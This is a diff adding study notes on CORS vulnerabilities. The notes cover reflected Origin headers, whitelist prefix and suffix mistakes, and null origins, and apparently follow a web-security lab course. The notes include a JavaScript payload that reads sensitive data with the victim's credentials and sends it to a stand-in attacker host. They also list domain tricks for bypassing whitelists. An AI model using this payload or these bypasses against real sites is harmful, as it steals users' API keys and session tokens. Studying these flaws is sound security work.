@@ -37,3 +37,75 @@ Replacing with the session key to login as admin (api visible here too).
 <br>
 <img src="corslab1_4.png" alt="Alt text" width="1000" height="900">
 </br>
+
+#### Server-generated ACAO header from client-specified Origin header
+
+ Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.
+
+One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed.
+
+For example:
+
+ ```
+GET /sensitive-victim-data HTTP/1.1
+Host: vulnerable-website.com
+Origin: https://malicious-website.com
+Cookie: sessionid=...
+```
+
+Responds with:
+
+```
+HTTP/1.1 200 OK
+Access-Control-Allow-Origin: https://malicious-website.com
+Access-Control-Allow-Credentials: true
+...
+```
+
+These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.
+
+Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
+
+```
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+	location='//malicious-website.com/log?key='+this.responseText;
+};
+```
+
+#### Errors parsing Origin headers
+
+Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the Access-Control-Allow-Origin header so that access is granted.
+
+Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
+
+for example:
+Suppose an application grants access to all domains ending in:
+<br>
+`normal-website.com`
+
+An attacker might be able to gain access by registering the domain:
+<br>
+`hackersnormal-website.com`
+
+Alternatively, suppose an application grants access to all domains beginning with
+<br>
+`normal-website.com`
+
+An attacker might be able to gain access using the domain:
+<br>
+`normal-website.com.evil-user.net`
+
+The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
+
+* Cross-origin redirects.
+* Requests from serialized data.
+* Request using the `file:` protocol.
+* Sandboxed cross-origin requests.
+
+#### Lab: CORS vulnerability with trusted null origin
